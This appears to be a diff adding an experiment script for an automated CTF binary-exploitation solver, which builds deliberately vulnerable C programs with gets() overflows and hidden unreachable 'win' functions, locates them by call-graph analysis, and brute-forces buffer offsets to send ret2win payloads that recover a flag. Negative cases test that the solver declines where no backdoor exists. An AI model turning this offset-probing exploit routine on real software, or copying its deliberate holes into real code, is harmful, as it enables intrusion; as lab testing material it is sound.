@@ -1,0 +1,306 @@
+"""
+v029_call_graph.src — 用调用图补“有入口但没链”：找回不引用字符串的后门
+
+要解决的问题
+    v028 的后门定位依赖两条线索：flag 字符串交叉引用、可疑符号名。
+    如果后门既不引用任何字符串、名字也随机，就会落到“win_not_found”。
+
+做法
+    从二进制反汇编建立函数级调用图：
+      - 根：ELF 入口、main（符号或 __libc_start_main 参数）、输入读取函数；
+      - 从根做可达性分析；
+      - “主流程不可达、但会调用 puts/printf/write/system”的函数 = 后门候选。
+
+测什么
+    D1 有符号、后门名随机、flag 以异或字节数组嵌在代码里 → 只能靠调用图找
+    D2 同题 strip 符号 → 还要从 _start 反推出 main
+    N1 有死函数但它不输出（无后门） → 必须拒绝给链
+    N2 有一个会输出的 banner，但 main 调用了它（可达） → 不能误判为后门
+
+验证方式
+    用产品代码 `secknow.solving.binary.analyze` 做分析，
+    再用执行验证：候选地址 + 偏移探测 → 真跑拿 flag。
+
+运行
+    python versions/v029_call_graph.src
+    python versions/v029_call_graph.src --seed 3
+
+产出
+    experiments/EXP-0029/{results.json,report.md,chal/}
+"""
+
+from __future__ import annotations
+
+import json
+import random
+import re
+import string
+import struct
+import subprocess
+import sys
+import time
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0029"
+CHAL_DIR = OUT_DIR / "chal"
+
+sys.path.insert(0, str(ROOT / "src"))
+
+from secknow.solving.binary import analyze  # noqa: E402
+from secknow.solving.chains import build_chains  # noqa: E402
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+
+
+def wsl_path(win_path: str | Path) -> str:
+    path = Path(win_path).resolve()
+    drive = path.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(path)[2:].replace("\\", "/")
+
+
+def run_wsl(args: list[str], stdin_data: bytes | None = None,
+            timeout: int = 15) -> tuple[int, str, str]:
+    try:
+        done = subprocess.run(["wsl", "-e", *args], input=stdin_data,
+                              capture_output=True, timeout=timeout)
+    except subprocess.TimeoutExpired:
+        return 124, "", "timeout"
+    return (done.returncode,
+            done.stdout.decode("utf-8", "replace"),
+            done.stderr.decode("utf-8", "replace"))
+
+
+def compile_c(source_path: Path, binary_path: Path, flags: list[str]) -> dict:
+    rc, out, err = run_wsl(["gcc", wsl_path(source_path), "-o", wsl_path(binary_path), *flags],
+                           timeout=120)
+    return {"result": "ok" if rc == 0 else "failed", "rc": rc, "stderr": err.strip()[-200:]}
+
+
+# --------------------------------------------------------------------------------------
+# 挑战生成
+# --------------------------------------------------------------------------------------
+
+def build_challenges(seed: int) -> list[dict]:
+    CHAL_DIR.mkdir(parents=True, exist_ok=True)
+    random.seed(seed)
+
+    flag = "flag{" + "".join(random.choices(string.hexdigits.lower(), k=10)) + "}"
+    encoded = bytes(ord(character) ^ 0x5A for character in flag)
+    encoded_text = ", ".join(f"0x{value:02x}" for value in encoded)
+    win = "fn_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+    dead_win_src = f"""#include <stdio.h>
+#include <unistd.h>
+
+static void {win}(void) {{
+    unsigned char data[16] = {{{encoded_text}}};
+    char out[17];
+    for (int i = 0; i < 16; i++) out[i] = data[i] ^ 0x5A;
+    out[16] = 0;
+    puts(out);
+    fflush(stdout);
+    _exit(0);
+}}
+
+int main(void) {{
+    char buf[64];
+    gets(buf);
+    return 0;
+}}
+"""
+    dead_silent_src = """#include <stdio.h>
+
+static int helper(int x) {
+    return x * 3 + 1;
+}
+
+int main(void) {
+    char buf[64];
+    gets(buf);
+    return 0;
+}
+"""
+    reachable_src = """#include <stdio.h>
+
+static void banner(void) {
+    puts("welcome");
+}
+
+int main(void) {
+    char buf[64];
+    banner();
+    gets(buf);
+    return 0;
+}
+"""
+    cases = [
+        {"id": "D1", "source": dead_win_src, "source_name": "d1_deadwin.c",
+         "binary_name": "d1", "flags": ["-fno-stack-protector", "-no-pie", "-O0"],
+         "expected": flag, "negative": False, "note": "符号在，但后门名随机、无 flag 字符串"},
+        {"id": "D2", "source": dead_win_src, "source_name": "d2_deadwin_stripped.c",
+         "binary_name": "d2", "flags": ["-fno-stack-protector", "-no-pie", "-O0", "-s"],
+         "expected": flag, "negative": False, "note": "strip 符号，main 需从 _start 反推"},
+        {"id": "N1", "source": dead_silent_src, "source_name": "n1_silent.c",
+         "binary_name": "n1", "flags": ["-fno-stack-protector", "-no-pie", "-O0"],
+         "expected": "", "negative": True, "note": "死函数不输出，不应给链"},
+        {"id": "N2", "source": reachable_src, "source_name": "n2_reachable.c",
+         "binary_name": "n2", "flags": ["-fno-stack-protector", "-no-pie", "-O0"],
+         "expected": "", "negative": True, "note": "会输出的 banner 可达，不能误判"},
+    ]
+    for case in cases:
+        source_path = CHAL_DIR / case["source_name"]
+        source_path.write_text(case["source"], encoding="utf-8")
+        binary = CHAL_DIR / case["binary_name"]
+        case["binary"] = binary
+        case["compile"] = compile_c(source_path, binary, case["flags"])
+    return cases
+
+
+# --------------------------------------------------------------------------------------
+# 分析 + 执行验证
+# --------------------------------------------------------------------------------------
+
+def exploit(profile, target: int, expected: str) -> dict:
+    hints = profile.stack_hints or []
+    candidates: list[int] = []
+    for hint in hints:
+        for delta in range(-8, 25, 8):
+            value = hint + delta
+            if value > 0 and value not in candidates:
+                candidates.append(value)
+    candidates.extend(value for value in range(24, 200, 8) if value not in candidates)
+
+    ret_gadget = None
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+    from elftools.elf.elffile import ELFFile
+
+    with open(profile.path, "rb") as handle:
+        elf = ELFFile(handle)
+        text = elf.get_section_by_name(".text")
+        engine = Cs(CS_ARCH_X86, CS_MODE_64)
+        for instruction in engine.disasm(text.data(), text["sh_addr"]):
+            if instruction.mnemonic == "ret":
+                ret_gadget = instruction.address
+                break
+
+    for attempt, offset in enumerate(candidates, 1):
+        payload = b"A" * offset
+        if ret_gadget is not None:
+            payload += struct.pack("<Q", ret_gadget)
+        payload += struct.pack("<Q", target)
+        rc, out, err = run_wsl([wsl_path(profile.path)], stdin_data=payload)
+        found = FLAG_RE.search(out)
+        if found and found.group(0).lower() == expected.lower():
+            return {"solved": True, "offset": offset, "attempts": attempt,
+                    "flag": found.group(0)}
+    return {"solved": False, "reason": "no_offset_worked", "attempts": len(candidates)}
+
+
+def evaluate(case: dict) -> dict:
+    started = time.perf_counter()
+    profile = analyze(case["binary"])
+    chain = build_chains(["unsafe_copy"], profile)[0]
+    record = {
+        "id": case["id"], "negative": case["negative"], "note": case["note"],
+        "compile": case["compile"],
+        "call_graph": profile.call_graph,
+        "candidates": profile.win_candidates,
+        "chain_status": chain.status,
+        "chain_reason": chain.reason,
+        "steps": [{"unit": step.unit, "status": step.status, "detail": step.detail}
+                  for step in chain.steps],
+    }
+
+    if case["negative"]:
+        record["solved"] = False
+        record["refused"] = (chain.status in {"blocked", "refused"}
+                              or len(profile.win_candidates) == 0)
+        record["verdict"] = "refused" if record["refused"] else "leaked"
+    else:
+        from_graph = [item for item in profile.win_candidates
+                      if item["source"] == "call-graph-dead-output"]
+        if not from_graph:
+            record.update({"solved": False, "refused": False,
+                           "reason": "call_graph_candidate_missing", "verdict": "failed"})
+        else:
+            result = exploit(profile, from_graph[0]["address"], case["expected"])
+            record.update(result)
+            record["verdict"] = "solved" if result["solved"] else "failed"
+    record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    log(f"{case['id']}: {record['verdict']}  chain={record['chain_status']}"
+        f"  dead_output={profile.call_graph.get('dead_output')}"
+        f"  {record['elapsed_ms']} ms")
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    positive = [item for item in results if not item["negative"]]
+    negative = [item for item in results if item["negative"]]
+    summary = {
+        "positive_total": len(positive),
+        "positive_solved": sum(1 for item in positive if item["solved"]),
+        "negative_total": len(negative),
+        "negative_correctly_refused": sum(1 for item in negative if item["refused"]),
+        "elapsed_ms": round(sum(item["elapsed_ms"] for item in results), 1),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0029 — 调用图补“有入口但没链”", "",
+             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2),
+             "```", "",
+             "## 逐题", "",
+             "| 题 | 调用图（函数/边/死/输出） | 链状态 | 判定 | 偏移 |",
+             "| --- | --- | --- | --- | --- |"]
+    for item in results:
+        graph = item["call_graph"]
+        graph_text = (f"{graph.get('functions')}/{graph.get('edges')}/"
+                      f"{graph.get('dead')}/{graph.get('dead_output')}")
+        lines.append(f"| {item['id']} | {graph_text} | {item['chain_status']} "
+                     f"| {item['verdict']} | {item.get('offset', '—')} |")
+    lines += ["", "## 说明", "",
+              "- 后门不引用 flag 字符串、名字也随机，v028 的线索全部失效；",
+              "- 调用图把“主流程不可达且会输出”的函数找回来；",
+              "- 找到后仍要用执行验证确认：候选地址 + 偏移探测 → 真跑拿 flag。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="调用图补后门候选 + 执行验证")
+    parser.add_argument("--seed", type=int, default=20261113)
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    cases = build_challenges(args.seed)
+    if args.only:
+        wanted = {item.strip() for item in args.only.split(",")}
+        cases = [case for case in cases if case["id"] in wanted]
+    log(f"挑战 {len(cases)} 个：{[case['id'] for case in cases]}")
+    results = [evaluate(case) for case in cases]
+    write_report(results)
+    positive = [item for item in results if not item["negative"]]
+    negative = [item for item in results if item["negative"]]
+    log(f"汇总：正样本 {sum(1 for item in positive if item['solved'])}/{len(positive)}，"
+        f"负样本正确拒绝 {sum(1 for item in negative if item['refused'])}/{len(negative)}")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
